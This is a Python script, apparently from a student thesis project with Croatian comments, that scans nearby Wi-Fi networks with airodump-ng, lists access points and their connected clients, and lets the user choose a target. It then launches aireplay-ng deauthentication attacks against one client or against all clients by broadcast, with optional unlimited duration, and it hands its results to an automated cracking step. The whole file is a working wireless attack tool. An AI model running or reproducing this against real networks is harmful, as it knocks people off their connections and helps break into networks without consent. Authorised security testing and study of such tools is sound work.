import subprocess
import sys
import time
import csv
import os
import glob
sys.path.append(os.path.join(os.path.dirname(__file__), "tests"))
sys.path.append("../zavrsni")
import setup
from asawt import del_file
from logger import logger


interface = None
DUMP_FILE = "dump"
N = 10


# Funkcija vraca najnoviju dump datoteku
def get_dump():
    # Uzima sve dump datoteke iz tekuceg direktorija
    csv_files = glob.glob("dump-*.csv")
    # Ako nema dump datoteka, obavijesti korisnika
    if not csv_files:
        print("No dump files found.")
        logger.error("No dump files found.")
        sys.exit(1)
    
    csv_file = max(csv_files, key=os.path.getmtime)

    return csv_file


# Funkcija vraća listu dostupnih mreza
def get_networks():
    # Dohvaca dump datoteku za citanje
    csv_file = get_dump()
    networks = []

    with open(csv_file, newline="") as f:
        reader = csv.reader(f)

        for row in reader:
            # Preskace prazne linije
            if len(row) == 0:
                continue
                
            # Preskace header
            if row[0].strip() == "BSSID":
                continue 

            # Ako dode do 'Station MAC' znaci da je dosao do dijela sa klijentima
            if row[0].strip() == "Station MAC":
                break

            # Parsira liniju iz dump datoteke
            if len(row) >= 14:
                bssid = row[0].strip()
                channel = row[3].strip()
                privacy = row[5].strip()
                essid = row[13].strip()
                power = row[8].strip()

                # Networks je lista dicta
                # Broj klijenata se dodaje naknadno
                networks.append({"essid": essid, "bssid": bssid, "channel": channel, "privacy": privacy, "power": power, "clients": 0})
    
    return networks


# Funkcija za pokretanje airodump-ng
def run_airodump(interface, seconds=N, dump_file=DUMP_FILE):
    print(f"Scanning around for {seconds} seconds...")
    logger.info(f"Scanning around for {seconds} seconds...")
    # Pokrece airodump-ng i zapisuje u CSV datoteku
    airodump = subprocess.Popen(["airodump-ng", "-w", dump_file, "--output-format", "csv", interface],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL
                                )

    try:
        # Ceka N sekundi
        time.sleep(seconds)
        airodump.terminate()
        airodump.wait(1)

    except KeyboardInterrupt:
        # U slucaju prekida, obavijesti korisnika
        airodump.terminate()
        print("\nAirodump-ng interrupted.")
        logger.error("\nAirodump-ng interrupted.")


# Funkcija pronalazi BSSID i kanal po imenu mreze
def parse_airodump(target_essid):
    # Dohvaca dump datoteku za citanje
    csv_file = get_dump()
    # Otvara CSV datoteku
    with open(csv_file, newline="") as f:
        reader = csv.reader(f)

        # Prolazi kroz svaki red
        for row in reader:
            # Provjerava radi li se o mreznom dijelu i usporeduje imena mreza
            if len(row) >= 14 and row[13].strip() == target_essid:
                bssid = row[0].strip()
                channel = row[3].strip()

                return bssid, channel

    print(f"Network {target_essid} not found.")
    logger.error(f"Network {target_essid} not found.")
    sys.exit(1)


# Funkcija izvrsava napad deautentifikacije
def start_deauth(interface, bssid, channel, target=None, timeout=None):
    try:
        # Mijenja kanal rada sucelja
        subprocess.run(["iwconfig", interface, "channel", channel], check=True)

        if target:
            # Konstruira napad za odredenu metu
            cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", target, interface]

        elif target is None:
            cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", "FF:FF:FF:FF:FF:FF", interface]

        # Pokrece napad
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Ako je korisnik naveo timeout
        if timeout:
            try:
                # Nakon N sekundi spavanja zavrsava napad
                time.sleep(int(timeout))
                proc.terminate()
                
            except ValueError:
                proc.wait()

        else:
            proc.wait()

    except KeyboardInterrupt:
        try:
            proc.terminate()

        except Exception:
            pass

    except subprocess.CalledProcessError:
        print("Failed to execute aireplay-ng.")
        logger.error("Failed to execute aireplay-ng.")
        sys.exit(1)


# Funkcija koja grupira klijente po BSSID-u
def get_clients_by_bssid():
    # Dohvaca dump datoteku za citanje
    csv_file = get_dump()
    clients_per_ap = {}

    try:
        with open(csv_file, newline="") as f:
            reader = csv.reader(f)
            section = False

            for row in reader:
                # Preskace praznu liniju
                if len(row) == 0:
                    continue

                # Pocetak dijela sa klijentima
                if row[0].strip() == "Station MAC":
                    section = True
                    continue

                if section and len(row) >= 6:
                    client_mac = row[0].strip()
                    ap_mac = row[5].strip()

                    if ap_mac not in clients_per_ap:
                        clients_per_ap[ap_mac] = []

                    clients_per_ap[ap_mac].append(client_mac)

    except FileNotFoundError:
        pass

    return clients_per_ap


def main(called_by="main"):
    # Dohvaca ime sucelja u monitor modu
    interface = setup.main()

    # Korisnik unosi vrijeme skeniranja
    scan_time = input("Enter scanning time: ")

    try:
        scan_time = int(scan_time)
        # Pokrece airodump-ng
        run_airodump(interface, seconds=scan_time, dump_file=DUMP_FILE)

    except ValueError:
        scan_time = N
        print("Invalid time input. Going with default scanning time.")
        logger.error("Invalid time input. Going with default scanning time.")
        # Pokrece airodump-ng na N sekundi
        run_airodump(interface, seconds=scan_time, dump_file=DUMP_FILE)

    # Ceka N sekundi
    time.sleep(scan_time + 1)
    # Dohvaca sve mreze
    networks = get_networks()
    # Dohvaca sve klijente za svaki AP
    clients = get_clients_by_bssid()

    # Dodaje broj klijenata svakoj mrezi
    for network in networks:
        network["clients"] = len(clients.get(network["bssid"], []))

    # Sortira mreze prema broju klijenata, pa po snazi signala
    networks.sort(key=lambda x: (x["clients"], int(x["power"])), reverse=True)

    # Prikaz za korisnika
    print("Found networks near you:")
    print(f"{'Index':>5}  {'Network Name':<40}  {'Clients':>6}  {'Encryption':<17}  {'CH':>5}  {'Power':>6}")
    print("-" * 90)

    for i, network in enumerate(networks):
        print(f"{i:>5}  {network['essid']:<40}  {network['clients']:>6}  {network['privacy']:<17}  {network['channel']:>5}  {network['power']:>6}")

    # Korisnik unosi index mreze
    index = input("Enter target network index: ")

    try:
        index = int(index)

    except ValueError:
        print("Invalid input.")
        logger.error("Invalid input.")
        del_file(DUMP_FILE)
        sys.exit(1)

    bssid = networks[index]["bssid"]
    channel = networks[index]["channel"]
    network_clients = clients.get(bssid)

    # Ispis klijenata odabrane mreze
    if network_clients:
        print("Clients on selected network:")

        for index, client in enumerate(network_clients):
            print(f"{index:>3}  {client}")
        
        # Korisnik unosi index klijenta
        targets= input("Enter specific client's index or press Enter to deauth all clients: ").strip()
    
    else:
        print("It's lonely out here, no active clients. Let's try broadcast deauth...")
        logger.info("No active clients found, trying with broadcast deauth.")
        targets = ""

    if targets:
        try:
            index = int(targets)
            if index >= 0 and index < len(network_clients):
                target = network_clients[index]
            else:
                print(f"Invalid index: {index}")
                logger.error("Invalid input.")
                # Brise dump datoteku
                del_file(DUMP_FILE)
                sys.exit(1)

        except ValueError:
            print("Invalid input.")
            logger.error("Invalid input.")
            del_file(DUMP_FILE)
            sys.exit(1)

    elif targets == "":
        target = None

    # Ako je skripta pozvana iz auto_crack stavi duljino automatski na 4 sekunde
    if called_by == "crack":

        return interface, bssid, channel, target, 4
    # Korisnik unosi trajanje napada
    timeout = input("Enter duration in seconds or press Enter for no limit: ").strip()

    # Provjerava unos korisnika za trajanje dapada
    try:
        if timeout != "":
            timeout = int(timeout)
    
    except ValueError:
        print("Invalid input.")
        logger.error("Invalid input.")
        del_file(DUMP_FILE)
        sys.exit(1)

    return interface, bssid, channel, target, timeout


if __name__ == "__main__":
    main()